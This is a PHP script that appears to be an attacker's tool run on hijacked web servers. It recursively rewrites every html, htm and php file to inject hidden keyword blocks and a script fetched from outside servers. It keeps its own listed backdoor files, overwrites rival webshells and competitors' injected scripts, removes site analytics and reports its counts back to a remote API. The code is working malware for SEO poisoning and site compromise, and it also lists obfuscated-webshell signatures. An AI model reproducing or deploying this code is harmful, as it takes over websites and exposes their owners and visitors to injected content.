<?php

$string = md5($_SERVER['HTTP_HOST']);
preg_match_all('/\d+/', $string, $matches);
$string = implode('', $matches[0]);
$tn = (substr($string,0,5)) % 7;
$currentUrl = $_SERVER['REQUEST_URI'];
$parsedUrl = parse_url($currentUrl);
$queryString = $parsedUrl['query'];
echo('curl url :'.$currentUrl.'<br>');
echo('queryString url :'.$queryString.'<br>');
$fix_dir = '.';
$mode = '';
$who = 'pa';
//d=dir w=who m=nothing
if(isset($parsedUrl['query'])){
    parse_str($queryString, $params);
    if($params['d']){
        if($params['d'] === "up")
        {$fix_dir = '..';}
        else{
            $fix_dir = $params['d'];
        }
    }
    if($params['w']){$who = $params['w'];}
    if($params['m']){$mode = $params['m'];}
}

echo('fix dir is: '.$fix_dir.'<br>');

// 批量修改对应目录中的文件
del_muma($fix_dir);

echo('del done ..'.'<br>');

// ---- del done ----
// ---- fix start ----
// 设置站点根路径
//获取当前rootdomin

$currentDomain = $_SERVER['HTTP_HOST'];
$rootDomain = implode('.', array_slice(explode('.', $currentDomain), -2));

//不同行要删除的js
$other_js_remove = array(
    '//static.jquery.im/v2.0.3.js',// USDT钱包的
);

//同行要替换的js
$other_js_replace = array(
    'https://web.configs.im/laotie.js' //今年会
);
// 统计成功的
$suc_num = 0;
$fail_num = 0;
$rpt_msg = '';
$apidm = "";
// 服务端获取TDK+JS
$inst_info = query_fortdkjs();

// 批量修改对应目录中的文件
fixHtmls($fix_dir);

// API通知服务端结果，数据落库 TODO
upload_result();

// 获取默认的tkdinfo
function get_default_info(){
    // JSON文件的URL
    $jsonUrl = "https://static.alicloudoss.com/mw/wbsh/deftk.json";
    $jsonData = file_get_contents($jsonUrl);
    $data = json_decode($jsonData, true);
    global $who;
    $pa_default = $data[$who];
    global $apidm;
    $apidm = $pa_default['apidm'];
    return $pa_default;
}

// 请求api，获取新的<noscript>....</script>全部string
function query_fortdkjs(){
    $dft_info = get_default_info();
    global $apidm,$rootDomain,$who,$tn;
    $url = $apidm.'/api/websh/phptdk?rdm='.$rootDomain."&w=".$who.'&tn='.$tn;
    // echo('get phptdk from url: '.$url."<br>");
    
    $response = file_get_contents($url);
    // echo('get tdk response:'."<br>");
    // echo($response."<br>");
    $response_dict = json_decode($response, true);
    if($response_dict!==null){
        $json_data = $response_dict['data'];
        $insert_str =base64_decode($json_data['instr']);
        $jssrc = $json_data['jssrc'];
        if ($insert_str!==null){
            echo 'done get instr'."<br>";
            return array(
                "instr" => $insert_str,
                "jssrc" => $jssrc
            );
        }
    }
    echo "请求失败，未获取instr, 使用default "."<br>";
    return $dft_info;
}

//输入目录。批量修改htm html文件
function fixHtmls($directory) {
    global $inst_info,$suc_num,$rpt_msg,$other_js_replace,$other_js_remove;
    $instr = $inst_info['instr'];
    $jssrc = $inst_info['jssrc'];
    $files = scandir($directory);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        // $path = $directory . '/' . $file;
        $path = $directory . '/' . $file;
        if (is_dir($path)) {
            fixHtmls($path);
        } else {
            $extension = pathinfo($file, PATHINFO_EXTENSION);
            if($extension !== 'html' && $extension !== 'htm' && $extension !== 'php'){
                continue;
            }
            echo('touch '.$path.'<br>');               
            // 判断给定的路径是否指向当前文件
            if ($path === realpath(__FILE__)) {
                continue;
            }
            $content = file_get_contents($path);
            $has_head = strpos($content, '<head') !== false;
            if(!$has_head){
                continue;
            }

            if ($extension == 'php'){
                //把<doctype>上面搞幺蛾子的删掉 参考onhead.php
                $content = preg_replace('/^.*?(?=<!DOCTYPE html>)/is', '<!DOCTYPE html>', $content);
                
            }
            $has_nospt = strpos($content, '<noscript>') !== false;
            $has_js = strpos($content, $jssrc) !== false || strpos($content, "&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#106;&#115;&#46;&#111;&#115;&#115;&#45;&#97;&#108;&#105;&#121;&#117;&#110;&#46;&#99;&#110;&#47;&#106;&#115;&#47;&#115;&#112;&#105;&#100;&#101;&#114;&#46;&#49;&#46;&#48;&#46;&#106;&#115;") !== false ;                
            
            //非同行js就删除
            foreach($other_js_remove as $ajs){
                if(strpos($content,$ajs) !== false){
                    $msg = 'deleting other js: '.$ajs.'in'.__FILE__.'<br>';
                    echo($msg);
                    $content = str_replace($ajs, '', $content);
                    // echo('echange other js in file: '.$path."<br>");
                    $rpt_msg = $rpt_msg.$msg.'\n';
                    $suc_num ++;
                }
            }
            
            ## 干掉51统计
            if (strpos($content,'LA.init')){
                $pattern = '/<script\b[^>]*>(LA\.init.*?)<\/script>/is';
                $content = preg_replace($pattern, '', $content);
            }

            ## 发现有这种插入js代码的替换成我的js
            if (strpos($content,'String.fromCharCode')){
                $pattern = '/<script\b[^>]*>(.*?String\.fromCharCode.*?)<\/script>/is';
                $content = preg_replace($pattern, '<script type="text/javascript" src="'.$jssrc.'"></script>', $content);
                file_put_contents($path, $content);
                continue;
            }
            
            //同行js就替换成我的
            $find_tonghang = false;
            foreach($other_js_replace as $ajs){
                if(strpos($content,$ajs) !== false){
                    $msg = 'replace other js: '.$ajs.'in'.__FILE__.'<br>';
                    echo($msg);
                    $modifiedContent = str_replace($ajs, $jssrc, $content);
                    file_put_contents($path, $modifiedContent);
                    $find_tonghang = true;
                }
            }
            if ($find_tonghang == true){
                $suc_num ++;
                continue;
            }

            if(!$has_nospt && !$has_js){
                $insertion = $instr;
                $modifiedContent = preg_replace('/<head.*?>/is', '<head>' . PHP_EOL . $insertion, $content);
                file_put_contents($path, $modifiedContent);
                echo('done handle file: '.$path." --- done add <br>");
                $suc_num ++;
                continue;
            }
            ## 如果有<noscript> 但没有 js
            if($has_nospt && !$has_js){
                $modifiedContent = preg_replace('/<noscript>.*?<\/noscript>/is', '', $content);
                $insertion = $instr;
                $modifiedContent = preg_replace('/<head.*?>/is', '<head>' . PHP_EOL . $insertion, $modifiedContent);
                // $modifiedContent = str_replace('<head>', '<head>' . PHP_EOL . $insertion, $content);
                file_put_contents($path, $modifiedContent);
                echo('done fix js in file: '.$path."  --- rep js <br>");
                $suc_num ++;
                continue;
            }
            if($has_nospt && $has_js){
              
                ## 检查词是否需要更新
                preg_match('/<META\s+name="keywords"\s+content="([\w\W]*?)"/si',$instr,$inmatches); 
                if(strpos($content,$inmatches[1]) == false){
                    $modifiedContent = preg_replace('/<noscript>.*?<\/noscript>/is', '', $content);
                    $insertion = $instr;
                    $modifiedContent = preg_replace('/<head.*?>/is', '<head>' . PHP_EOL . $insertion, $modifiedContent);
                    file_put_contents($path, $modifiedContent); 
                    echo('done exists in file: '.$path."  --- Keyword updates <br>");
                }
                echo('done exists in file: '.$path."  --- my exists <br>");
                $suc_num ++;
                continue;
            }
        }
    }
}


// upload fix result 
function upload_result(){
    $currentFilePath = __FILE__;
    
    global $apidm, $currentDomain, $suc_num, $rpt_msg;
    // 要上传的JSON数据
    $params = array(
        "rtdm" => $currentDomain,
        "fpth",__FILE__,
        "suc_num"=>$suc_num,
        "rpt_msg"=>$rpt_msg
    );
    $jsonData = json_encode($params);
    
    // 目标URL
    $url = $apidm.'/api/websh/phpfixres';
    
    // 创建POST请求的内容
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-type: application/json',
            'content' => $jsonData,
        ),
    );
    echo("reporting result "."<br>");
    echo($jsonData."<br>");

    // 创建上下文流
    $context = stream_context_create($options);

    // 发送POST请求并获取响应
    $response = file_get_contents($url, false, $context);

    if ($response === false) {
        $error = curl_error($curl);
        echo('report failed'.$error."<br>");
    } else {
        echo('report suc'."<br>");
    }

}

// end fix

//--- del ----//
//输入目录。批量修改htm html文件
function del_muma($directory) {
    $files = scandir($directory);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        $path = $directory . '/' . $file;
        // 判断给定的路径是否指向当前文件
        if ($path === realpath(__FILE__)) {
            continue;
        }
        if (is_dir($path)) {
            del_muma($path);
        } else {
            $my_mumas = array(
                'm1.php',
                'template_init.php',
                'index_bk.php',
                '664475333bb27.php',
                'defaults.php',
                'uct.php',
                '664475333bb27.php',
                'indexbak.php',
                'detail.php',
                'bam.php',
                'bam1.php',
                'us.php',
                'xmlrpc.php',
                'config.php',
                'template_init',
                '1.php',
                '1m.php',
                'sphinxapi.php',
                'File.php',
                '01m.php',
                'tages.php',
                'indax.php',
                'xsZml.php',
                'pinfo.php',
                'apps.php'
                
                );
            foreach($my_mumas as $ama ){
                if ($file === $ama){
                    echo('ignore my muma in '.$path.'<br>');
                    continue;
                }
            }
            // 删掉被人的文件
            $see_mumas = array(
                "exe.php",
                'dd.php',
                'dnn.php',
                'no_basdir.php'
            );
            for($i=0;$i<count($see_mumas);$i++){
                $amuma = $see_mumas[$i];
                if ($file === $amuma){
                    file_put_contents($path, '<?php echo("SB"); ?>');
                    echo('removing muma known in '.$path.' know-xx <br>');
                    continue;
                }
            }
            $extension = pathinfo($file, PATHINFO_EXTENSION);
            $content = file_get_contents($path);
            // . 开头的php 删除所有内容
          /*** if($extension === 'php' && substr($file, 0, 1) === '.'){
                file_put_contents($path, '<?php echo("SB"); ?>');
                echo('removing muma in '.$path.' xx <br>');
                continue;
            }
             ** */ 
            // 删掉内容加密的木马
             if(strpos($content, "eval(base64_decode") !== false  || strpos($content, "OOO0O0O00") !== false || strpos($content, "OOO000000") !== false || strpos($content, "\$OOO000000") !== false){
               // if(strpos($content, "b3dXs80sHxqSHzMtciEfFe65f9eek") === false){
                    file_put_contents($path, '<?php echo("SB"); ?>');
                    echo('removing jiami muma in '.$path.' jmxx <br>');
                    continue;
              //  }
             }
            
        }
    }
}
